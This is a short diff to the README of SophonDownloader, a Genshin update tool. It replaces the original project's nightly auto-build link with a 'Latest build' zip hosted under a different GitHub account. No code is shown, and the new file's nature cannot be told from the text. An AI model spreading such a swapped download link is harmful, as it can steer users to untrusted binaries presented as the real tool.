@@ -11,7 +11,7 @@ After Genshin forced SophonChunks to update and stopped giving zip files for upd
 
 # Download
 
-* Latest auto-build available [here](https://nightly.link/Escartem/SophonDownloader/workflows/build/master/Sophon.Downloader.zip) ✨
+* Latest build available [here](https://github.com/pmagixc/SophonDownloader/releases/download/rel/net9.0.zip) ✨
 
 ---
 
